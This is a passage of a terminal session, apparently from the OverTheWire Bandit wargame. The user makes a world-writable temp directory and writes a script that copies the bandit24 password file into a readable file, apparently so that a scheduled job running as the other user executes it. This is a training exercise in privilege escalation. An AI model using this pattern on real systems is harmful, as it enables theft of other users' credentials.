...
/tmp/tmp.hBVMaFjZOX
bandit23@bandit:~$ chmod 777 /tmp/tmp.hBVMaFjZOX
bandit23@bandit:~$ cd /tmp/tmp.hBVMaFjZOX
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.hBVMaFjZOX/password" > script.sh
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.hBVMaFjZOX/password
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ touch password
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ chmod 777 password
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.hBVMaFjZOX$ ls -la
total 10816
